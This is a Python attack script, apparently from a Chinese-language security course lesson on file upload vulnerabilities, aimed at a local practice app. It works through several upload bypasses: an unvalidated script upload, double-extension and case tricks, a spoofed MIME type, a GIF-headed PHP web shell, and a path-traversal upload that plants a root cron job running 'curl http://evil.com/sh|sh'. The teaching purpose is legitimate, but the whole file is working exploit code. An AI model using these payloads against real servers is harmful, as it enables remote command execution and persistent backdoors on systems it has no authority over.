#!/usr/bin/env python3
"""
第六课：文件上传漏洞 - 攻击脚本
功能：演示各种文件上传绕过技术
"""

import requests
import os

TARGET = "http://127.0.0.1:5000"

def attack_no_check():
    """攻击无校验的上传点：直接上传恶意脚本"""
    print("\n[1] 攻击无校验上传点")
    # 构造一个恶意 Python 脚本
    malicious_content = b"import os; os.system('whoami')"
    files = {'file': ('shell.py', malicious_content, 'application/octet-stream')}
    r = requests.post(f"{TARGET}/upload1", files=files)
    print(f"  响应: {r.text}")

def attack_blacklist_bypass():
    """绕过黑名单：双扩展名 / 大小写 / 末尾点"""
    print("\n[2] 绕过黑名单校验")
    # 方法1：双扩展名 shell.py.jpg
    files = {'file': ('shell.py.jpg', b'GIF89a\nimport os', 'image/jpeg')}
    r = requests.post(f"{TARGET}/upload2", files=files)
    print(f"  双扩展名绕过: {r.text}")
    # 方法2：大小写 .pY
    files = {'file': ('shell.pY', b'import os', 'application/octet-stream')}
    r = requests.post(f"{TARGET}/upload2", files=files)
    print(f"  大小写绕过: {r.text}")

def attack_mime_bypass():
    """绕过 MIME 校验：篡改 Content-Type"""
    print("\n[3] 绕过 MIME 校验")
    # 上传 .py 文件，但 Content-Type 改成 image/jpeg
    files = {'file': ('shell.py', b'import os; os.system("id")', 'image/jpeg')}
    r = requests.post(f"{TARGET}/upload3", files=files)
    print(f"  MIME篡改绕过: {r.text}")

def attack_image_webshell():
    """图片马：在真实图片末尾插入恶意代码"""
    print("\n[4] 图片马攻击")
    # GIF 文件头 + 恶意代码
    gif_header = b'GIF89a'
    malicious_code = b'\n<?php system($_GET["cmd"]); ?>'
    files = {'file': ('avatar.gif', gif_header + malicious_code, 'image/gif')}
    r = requests.post(f"{TARGET}/upload_safe", files=files)
    print(f"  图片马上传: {r.text}")

def attack_path_traversal():
    """路径穿越：文件名包含 ../"""
    print("\n[5] 路径穿越攻击")
    files = {'file': ('../../../etc/cron.d/backdoor', b'* * * * * root curl http://evil.com/sh|sh', 'text/plain')}
    r = requests.post(f"{TARGET}/upload1", files=files)
    print(f"  路径穿越: {r.text}")

if __name__ == '__main__':
    print("=" * 50)
    print("文件上传漏洞攻击演示")
    print("=" * 50)
    print("请先运行 vulnerable_app.py 启动靶场")
    try:
        attack_no_check()
        attack_blacklist_bypass()
        attack_mime_bypass()
        attack_image_webshell()
        attack_path_traversal()
    except requests.exceptions.ConnectionError:
        print("\n[!] 无法连接靶场，请先运行: python vulnerable_app.py")
